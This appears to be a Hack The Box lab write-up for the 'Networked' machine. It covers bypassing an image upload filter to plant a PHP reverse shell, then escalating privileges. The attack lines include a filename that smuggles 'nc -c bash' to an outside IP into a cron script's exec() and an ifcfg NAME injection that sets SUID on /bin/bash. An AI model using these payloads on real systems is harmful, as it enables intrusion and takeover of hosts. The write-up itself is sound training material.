# networked
## interesting


## services

### Nmap scan:
```bash
Nmap scan report for 10.129.254.65
Host is up (3.5s latency).
Not shown: 878 filtered tcp ports (no-response), 119 filtered tcp ports (host-unreach)
PORT    STATE  SERVICE VERSION
22/tcp  open   ssh     OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey:
|   2048 2275d7a74f81a7af5266e52744b1015b (RSA)
|   256 2d6328fca299c7d435b9459a4b38f9c8 (ECDSA)
|_  256 73cda05b84107da71c7c611df554cfc4 (ED25519)
80/tcp  open   http    Apache httpd 2.4.6 ((CentOS) PHP/5.4.16)
|_http-server-header: Apache/2.4.6 (CentOS) PHP/5.4.16
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
443/tcp closed https

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 123.85 seconds
```
### open ports
* 22 - ssh 
* 80 - http - apache/2.4.6 running on PHP/5.4.16

nmap scan revealed that server is running CentOS and web application is likely using PHP in backend


## HTTP

Website is a blank page with random text that doesn't provide anything helpful

* /backup
this page included a tar ball with the upload, photos, and index php source code

* /upload.php

upload form for images

* /photos.php
gallery of uploaded images


## static analysis

After getting access to the source code of the web application we can see the user controllable input easily by using grep:
```bash
$ grep -i '$_' *
grep: backup.tar: binary file matches
lib.php:<form action="<?php echo $_SERVER['PHP_SELF']; ?>" method="post" enctype="multipart/form-data">
photos.php:  if ((strpos($exploded[0], '10_10_') === 0) && (!($prefix === $_SERVER["REMOTE_ADDR"])) ) {
upload.php:if( isset($_POST['submit']) ) {
upload.php:  if (!empty($_FILES["myFile"])) {
upload.php:    $myFile = $_FILES["myFile"];
upload.php:    if (!(check_file_type($_FILES["myFile"]) && filesize($_FILES['myFile']['tmp_name']) < 60000)) {
upload.php:    //$name = $_SERVER['REMOTE_ADDR'].'-'. $myFile["name"];
upload.php:    $name = str_replace('.','_',$_SERVER['REMOTE_ADDR']).'.'.$ext;
```
This shows all the superglobal variables used within the source.

For the $\_SERVER supergloabl variables we do not control the input for these, so they can be ignored.

It doesn't look like we control anything that would lead to execution in here, but there is file upload validation going on that we should take a look at and see if its vulnerable.

Inside of upload.php a function is called from lib.php that validates files based on three parameters:
> magic mime number - file must have a magic number from an image file type
```php

function file_mime_type($file) {
  $regexp = '/^([a-z\-]+\/[a-z0-9\-\.\+]+)(;\s.+)?$/';
  if (function_exists('finfo_file')) {
    $finfo = finfo_open(FILEINFO_MIME);
    if (is_resource($finfo)) // It is possible that a FALSE value is returned, if there is no magic MIME database file found on the system
    {
      $mime = @finfo_file($finfo, $file['tmp_name']);
      finfo_close($finfo);
      if (is_string($mime) && preg_match($regexp, $mime, $matches)) {
        $file_type = $matches[1];
        return $file_type;
      }
    }
  }
```
> extension - jpg,png,gif or jpeg

    //$name = $_SERVER['REMOTE_ADDR'].'-'. $myFile["name"];
    list ($foo,$ext) = getnameUpload($myFile["name"]);
    $validext = array('.jpg', '.png', '.gif', '.jpeg');
    $valid = false;
    foreach ($validext as $vext) {
      if (substr_compare($myFile["name"], $vext, -strlen($vext)) === 0) {
        $valid = true;
      }
    }

> size - less than 60000 bytes

So in order to bypass the file upload server side validation we will need to prepend a reverse shell with a magic number of an image file, append a valid image extension to the file, and make sure the file does not exceed 60000 bytes.

```bash
┌──(kali㉿kali)-[~/htb/box/networked/scripts]
└─$ file php-reverse-shell.php
php-reverse-shell.php: PHP script, ASCII text

┌──(kali㉿kali)-[~/htb/box/networked/scripts]
└─$ echo "GIF8;$(cat php-reverse-shell.php)" > php-reverse-shell.php

┌──(kali㉿kali)-[~/htb/box/networked/scripts]
└─$ file php-reverse-shell.php
php-reverse-shell.php: GIF image data 16188 x 26736
```


After making these changes to a valid php reverse shell we are able to upload the file, navigate to the photos.php page, open our image in a new tab and receive the reverse shell.

## PE

initial foothold is with www-data, but we do have access to the user guly's home directory where two files exist. One being a script to detect files uploaded to the uploads directory as attack attempts and the other as a snippet from crontab revealing that the script is ran every 3 minutes.

The script uses exec unsafely as it passes a user controller variable into exec(). This variable is the filename which is usually assigned by uploads.php, but since we have write access to uploads/ we can create a file with any name we like.

```php
exec("nohup /bin/rm -f $path$value > /dev/null 2>&1 &");
```
This is the $value variable, so we can create a file with touch of a valid bash command to inject into this exec line.

```php
exec("nohup /bin/rm -f $path; nc -c bash 10.10.14.142 6666; > /dev/null 2>&1 &");
```
Now we have a reverse shell being sent by the user guly and we have escalated our privilege laterally.


## PE 2 - ROOT

sudo -l with guly returns:
```bash
User guly may run the following commands on networked:
    (root) NOPASSWD: /usr/local/sbin/changename.sh
```

changename.sh is used to edit the ifcfg configuration file of the interface guly0, **but** there is a vulnerability in how CentOS handles network scripts, specifically the attribute NAME. If a space is entered after the attribute value, anything following that space will be executed as root.
```bash
[guly@networked ~]$ cat /etc/sysconfig/network-scripts/ifcfg-guly
DEVICE=guly0
ONBOOT=no
NM_CONTROLLED=no
NAME=test chmod 4755 /bin/bash
PROXY_METHOD=test
BROWSER_ONLY=test
BOOTPROTO=test
```
Notice in **NAME**, after the value test, I have entered a command to add a suid bit to the bash binary. Now when ifup is ran on the interface guly0, this command will be run. Note that ifup and other commands manipulating network interfaces generally have to be run with root priv, so the injected bash command will also be with escalated priv.

After which we just create a new bash shell with persistent priv and we have **ROOT**
